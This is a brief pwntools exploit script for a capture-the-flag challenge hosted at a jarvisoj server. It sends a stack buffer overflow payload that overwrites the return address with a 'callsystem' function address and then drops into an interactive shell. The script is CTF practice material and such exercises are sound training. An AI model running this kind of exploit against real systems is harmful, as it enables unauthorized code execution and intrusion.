#coding:utf-8

from pwn import *

pwn = remote("pwn2.jarvisoj.com", 9881)

pwn.recvuntil("Hello, World\n")

callsystem_addr = 0x000000000400596
payload = 'a'*(0x80+8) + p64(callsystem_addr)

pwn.sendline(payload)
pwn.interactive()
